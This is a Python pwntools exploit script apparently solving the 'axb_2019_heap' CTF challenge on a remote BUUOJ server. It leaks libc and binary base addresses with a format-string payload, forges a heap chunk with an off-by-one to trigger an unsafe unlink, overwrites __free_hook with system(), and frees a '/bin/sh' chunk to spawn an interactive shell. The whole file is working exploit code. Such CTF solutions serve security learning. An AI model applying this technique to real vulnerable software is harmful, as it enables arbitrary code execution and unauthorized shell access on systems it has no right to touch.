# coding:utf-8
from glob import glob
from os import system
from random import SystemRandom
from pwn import *
context.log_level = 'debug'

proc_name = 'axb_2019_heap'
islocal = 0
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 28198)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def add(index, size, content):
    p.recvuntil(">> ")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(index))
    p.recvuntil(":\n")
    p.sendline(str(size))
    p.recvuntil(": \n")
    p.sendline(content)

def delete(index):
    p.recvuntil(">> ")
    p.sendline("2")
    p.recvuntil(":\n")
    p.sendline(str(index))

def show():
    p.sendline("3")

def edit(index, content):
    p.recvuntil(">> ")
    p.sendline("4")
    p.recvuntil(":\n")
    p.sendline(str(index))
    p.recvuntil(": \n")
    p.sendline(content)

def leak():
    global heap_ptr
    global __free_hook
    global system_addr
    global main_base

    p.recvuntil('Enter your name: ')
    p.sendline("%15$p.%19$p")
    # __libc_start_main_ret = int(p.recvuntil('840')[-14:],16)      # local 
    __libc_start_main_ret = int(p.recvuntil('830')[-14:],16)
    __libc_start_main = __libc_start_main_ret - 240
    p.recvuntil("0x")
    main_base = int(p.recv()[0:12],16) - 0x116a
    # libc_base = __libc_start_main - 0x20840                       # local
    libc_base = __libc_start_main - 0x20740
    heap_ptr = main_base + 0x202060
    __free_hook = libc_base + 0x3c67a8
    # system_addr = libc_base + 0x453a0     # local
    system_addr = libc_base + 0x45390
    log.success('libc_base => ' + hex(libc_base))
    log.success('__libc_start_main_ret=> ' + hex(__libc_start_main_ret))
    log.success('__libc_start_main => ' + hex(__libc_start_main))
    log.success('main_base => ' + hex(main_base))
    log.success('heap_ptr => ' + hex(heap_ptr))
    log.success('__free_hook => ' + hex(__free_hook))
    log.success('system_addr => ' + hex(system_addr))
    # pause()

def unlink():
    show()
    # add(0, 0x88, 'a' * 0x90)        # 0x88不合适，因为构造fake chunk的时候，chunk_size为0x80
    add(0, 0x98, 'a' * 0x90)
    # debug(0)
    add(1, 0x90, 'b' * 0x90)
    add(2, 0x88, '/bin/sh\x00')         # system('/bin/sh')
    # debug(0)
    
    payload  = p64(0)                   # fake prev_size
    payload += p64(0x91)                # fake size
    payload += p64(heap_ptr - 0x18)     # fake fd
    payload += p64(heap_ptr - 0x10)     # fake bk(target)
    payload += p64(0) * 14              # padding 
    payload += p64(0x90)                # fake prev_size
    payload += b'\xa0'                  # off-by-one to change PREV_INUSE of next chunk
    edit(0, payload)
    # debug(0)

    delete(1)                           # trigger unsafe unlink attack
    # debug(0)

def pwn():
    edit(0, p64(0)*3 + p64(__free_hook) + p64(0x10))
    # debug(0)
    edit(0, p64(system_addr))
    # debug(0)
    delete(2)
    pause()

    p.interactive()

if __name__ == '__main__':
    leak()
    unlink()
    pwn()